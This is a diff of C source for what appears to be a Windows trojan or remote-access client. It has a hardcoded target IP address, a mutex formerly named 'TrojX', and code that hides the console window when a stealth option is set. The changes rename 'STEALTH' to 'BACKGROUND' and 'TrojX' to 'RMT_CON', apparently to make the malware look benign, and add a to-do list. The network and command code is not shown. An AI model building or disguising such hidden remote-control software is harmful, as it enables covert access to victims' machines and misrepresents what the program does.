@@ -20,6 +20,18 @@
  * You should have received a copy of the GNU General Public License
  * along with this program; if not, write to the Free Software
  * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+ * 
+ * 
+ * 
+ * To-do:
+ *      - thread stdout, stderr
+ *      - remove dtor
+ *      - add proper cleanups
+ *      - split functions into files
+ * 
+ * 
+ * 
+ * 
  */
 
 #define _WIN32_WINNT  0x501
@@ -35,11 +47,11 @@
 // client options
 #define DEBUG
 //#define RUN_AS_ADMIN
-//#define STEALTH
+//#define BACKGROUND
 
 #define DTOR __attribute__((destructor))
 
-#define MUTEX_VAL "TrojX"
+#define MUTEX_VAL "RMT_CON"
 
 // target options
 #define TARGET_IP "27.253.116.172"
@@ -331,7 +343,7 @@ int main (int argc, char *argv[]) {
     #endif
 
     // hide window
-    #ifdef STEALTH
+    #ifdef BACKGROUND
     AllocConsole ();
     ShowWindow (FindWindowA ("ConsoleWindowClass", NULL), SW_HIDE);
     #endif
